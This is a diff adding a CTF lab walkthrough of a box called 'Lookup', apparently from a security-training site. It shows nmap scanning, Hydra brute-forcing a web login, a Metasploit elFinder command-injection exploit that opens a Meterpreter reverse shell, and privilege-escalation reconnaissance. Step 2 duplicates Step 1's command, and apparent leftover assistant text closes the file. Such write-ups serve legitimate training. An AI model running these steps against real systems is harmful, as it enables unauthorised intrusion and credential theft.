@@ -611,3 +611,212 @@ Root Flag.txt
 root@lookup:~# cat /root/root.txt 
 5a285a9f257e45c68bb6c9f9f57d18e8
 ```
+done
+
+
+
+
+
+
+
+
+## Walkthrough: Network Penetration Testing
+
+### Scanning the Target Network
+
+We begin by scanning the target machine `10.10.80.211` using Nmap to identify open ports and services.
+
+```bash
+death@esther:~$ nmap 10.10.80.211 -sV -sC
+```
+
+Output:
+```
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 17:27 IST
+Nmap scan report for lookup.thm (10.10.80.211)
+Host is up (0.16s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+```
+
+#### Observations:
+- Open ports:
+  - SSH on port 22
+  - HTTP on port 80
+
+### Adding Target to Hosts File
+
+For easier navigation, we add the target's IP to the `/etc/hosts` file.
+
+```bash
+echo "10.10.80.211 lookup.thm" | sudo tee -a /etc/hosts
+```
+
+### Navigating to the Web Application
+
+After adding the IP to the hosts file, we open the web application in a browser. The login page appears:
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/e3dda654-cb00-4625-ad95-842636be7b6b" height="300"></img>
+</div>
+
+#### Attempting Default Login Credentials
+
+We attempt to log in with common default credentials but are met with a "wrong password" message and a 3-second delay before redirection:
+
+```bash
+Wrong password. Please try again.
+Redirecting in 3 seconds.
+```
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/a67607f7-9110-4af0-8df1-c3a934b196af" height="250"></img>
+</div>
+
+### Brute Forcing Login Using Hydra
+
+Since the default credentials didn’t work, we proceed with brute-forcing the login page using Hydra.
+
+#### Step 1: Finding the Password
+
+```bash
+hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
+```
+
+Output:
+```
+[80][http-post-form] host: lookup.thm   login: jose   password: password123
+```
+
+We successfully find the username `jose` with password `password123`.
+
+#### Step 2: Finding the Username
+
+Next, we brute force the username:
+
+```bash
+hydra -L wordlists/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
+```
+
+Output:
+```
+[80][http-post-form] host: lookup.thm   login: jose   password: password123
+```
+
+We confirm that the valid credentials are `jose:password123`.
+
+### Logging In
+
+We use the found credentials to log into the system:
+
+```bash
+login: jose
+password: password123
+```
+
+After logging in, we are redirected to another domain. We update the `/etc/hosts` file again:
+
+```bash
+echo "10.10.80.211 files.lookup.thm" | sudo tee -a /etc/hosts
+```
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/adff4566-9664-4b7b-aa19-9653712564aa" height="300"></img>
+</div>
+
+### Exploring the `credential.txt` File
+
+Upon opening the `credential.txt` file, we find some credentials, which might be for SSH:
+
+<div align="center">
+<img src="https://github.com/user-attachments/assets/e27d8329-be23-44fd-8c4b-ac731cf6309c" height="400"></img>
+</div>
+
+We attempt to use these credentials for SSH login:
+
+```bash
+ssh think@10.10.80.211
+```
+
+However, this attempt fails:
+
+```bash
+think@10.10.80.211's password:
+Permission denied, please try again.
+```
+
+### Identifying Vulnerabilities
+
+While interacting with the system, I discover a vulnerable web application, `elFinder`, running on the target machine. We search for exploits related to the `elFinder` version:
+
+```bash
+msfconsole -q
+msf6 > search elfinder 2.1.47
+```
+
+Output:
+```
+Matching Modules:
+   exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
+```
+
+We decide to exploit the vulnerability using Metasploit.
+
+### Exploit Setup
+
+First, we select the exploit module:
+
+```bash
+use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
+```
+
+Then, we set the `LHOST` and `RHOST`:
+
+```bash
+set LHOST tun0
+set RHOST files.lookup.thm
+```
+
+Finally, we run the exploit:
+
+```bash
+run
+```
+
+We successfully get a Meterpreter shell:
+
+```bash
+[*] Meterpreter session 1 opened (10.17.14.127:4444 -> 10.10.80.211:35566) at 2025-01-05 18:11:50 +0530
+```
+
+### Escalating Privileges
+
+Once we have the Meterpreter session, we attempt to escalate privileges by swapping the shell:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+We confirm our user is `www-data` and check for the presence of the `think` user in `/etc/passwd`.
+
+```bash
+cat /etc/passwd
+```
+
+We confirm that `think` is a user, and we need to find their password to escalate privileges.
+
+### Finding SUID Binaries
+
+We look for SUID binaries that may allow privilege escalation:
+
+```bash
+find / -perm /4000 2>/dev/null
+```
+
+This reveals a list of binaries that are potential candidates for privilege escalation.
+
+---
+
+This cleaned-up walkthrough provides a more concise and structured explanation of the process, highlighting important actions and outputs. You can use this markdown format in your GitHub repository, and make sure the images are correctly linked as shown in the `<div><img></img></div>` tags.
